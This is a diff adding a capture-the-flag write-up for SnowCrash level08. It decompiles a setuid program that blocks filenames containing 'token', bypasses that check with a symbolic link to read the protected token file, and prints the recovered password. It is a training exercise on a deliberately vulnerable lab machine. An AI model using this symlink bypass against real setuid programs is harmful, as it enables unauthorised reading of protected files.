@@ -1,0 +1,76 @@
+This level contain 2 file, 1 program 'level08', and an other file 'token'
+
+level08@SnowCrash:~$ ls -l
+total 16
+-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
+-rw-------  1 flag08 flag08    26 Mar  5  2016 token
+
+token is not accessible, we have no right at all on it
+
+as we use the decompiler on 'level08' we see :
+
+int32_t main(int argc, char** argv, char** envp)
+{
+    char** envp_1 = envp;
+    void* gsbase;
+    int32_t eax_2 = *(gsbase + 0x14);
+    
+    if (argc == 1)
+    {
+        printf("%s [file to read]\n", *argv);
+        exit(1);
+        /* no return */
+    }
+    
+    if (strstr(argv[1], "token"))
+    {
+        printf("You may not access '%s'\n", argv[1]);
+        exit(1);
+        /* no return */
+    }
+    
+    int32_t fd = open(argv[1], 0);
+    
+    if (fd == 0xffffffff)
+    {
+        err(1, "Unable to open %s", argv[1]);
+        /* no return */
+    }
+    
+    void buf;
+    ssize_t nbytes = read(fd, &buf, 0x400);
+    
+    if (nbytes == 0xffffffff)
+    {
+        err(1, "Unable to read fd %d", fd);
+        /* no return */
+    }
+    
+    ssize_t result = write(1, &buf, nbytes);
+    
+    if (eax_2 == *(gsbase + 0x14))
+        return result;
+    
+    __stack_chk_fail();
+    /* no return */
+}
+
+apparently, the program check argv[1] with "token" and exit if the FILENAME has the substring "token" in it
+but anyway, if the file token exist it means that we need to read what's inside of it.
+The first idea is to try to change the file name 'token', but because we dont have any right in it we cant do cmds such as 'mv' or 'cp'
+so let's create a shortcut to our file, it should change the overload the name of the file by the shortcut name, but the content remain the content of token.
+The cmd to do so : 'ln'
+
+ln -s ~/token /tmp/shortcut
+
+Let's check it :
+
+level08@SnowCrash:~$ ls -l /tmp/shortcut
+lrwxrwxrwx 1 level08 level08 24 Jul 21 17:36 /tmp/shortcut -> /home/user/level08/token
+
+Then we try our idea by using /tmp/shortcut as input :
+
+level08@SnowCrash:~$ ./level08 /tmp/shortcut
+quif5eloekouj29ke0vouxean
+
+We found the flag08 password ! ggwp
